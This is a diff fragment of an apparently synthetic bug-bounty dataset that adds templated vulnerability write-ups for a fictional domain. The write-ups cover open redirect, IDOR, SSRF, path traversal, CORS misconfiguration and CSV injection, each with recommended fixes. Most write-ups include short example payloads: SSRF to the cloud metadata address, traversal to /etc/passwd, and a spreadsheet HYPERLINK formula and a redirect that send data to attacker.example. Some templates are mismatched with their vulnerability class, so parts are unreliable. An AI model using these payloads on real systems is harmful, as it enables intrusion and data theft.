+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.waldlicht-bildung.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8332,7 +8396,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8494,7 +8559,8 @@
           "offset": "6d 20h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8634,7 +8700,8 @@
           "offset": "1d",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.waldlicht-bildung.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8730,7 +8797,8 @@
           "offset": "1d 7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.waldlicht-bildung.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8815,7 +8883,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8966,7 +9035,8 @@
           "offset": "7d 2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.waldlicht-bildung.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9070,7 +9140,8 @@
           "offset": "1d 5h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.waldlicht-bildung.foo/export`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9183,7 +9254,8 @@
           "offset": "6h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9363,7 +9435,8 @@
           "offset": "7d 7h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.waldlicht-bildung.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9490,7 +9563,8 @@
           "offset": "5d",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.waldlicht-bildung.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9590,7 +9664,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.waldlicht-bildung.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9726,7 +9801,8 @@
           "offset": "1d 22h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.waldlicht-bildung.foo/import`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9838,7 +9914,8 @@
           "offset": "4d 22h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.waldlicht-bildung.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9968,7 +10045,8 @@
           "offset": "1d 4h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.waldlicht-bildung.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10102,7 +10180,8 @@
           "offset": "7d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10216,7 +10295,8 @@
           "offset": "18h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10320,7 +10400,8 @@
           "offset": "3d 12h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.waldlicht-bildung.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10439,7 +10520,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.waldlicht-bildung.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10542,7 +10624,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10658,7 +10741,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.waldlicht-bildung.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10826,7 +10910,8 @@
           "offset": "2d 5h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10953,7 +11038,8 @@
           "offset": "4d 9h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.waldlicht-bildung.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11092,7 +11178,8 @@
           "offset": "3d 18h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.waldlicht-bildung.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11230,7 +11317,8 @@
           "offset": "1d 20h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.waldlicht-bildung.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11352,7 +11440,8 @@
           "offset": "4d 14h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11535,7 +11624,8 @@
           "offset": "6d 17h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11687,7 +11777,8 @@
           "offset": "2d 10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.waldlicht-bildung.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11825,7 +11916,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11929,7 +12021,8 @@
           "offset": "8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.waldlicht-bildung.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12061,7 +12154,8 @@
           "offset": "4d 13h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.waldlicht-bildung.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12185,7 +12279,8 @@
           "offset": "1d 19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
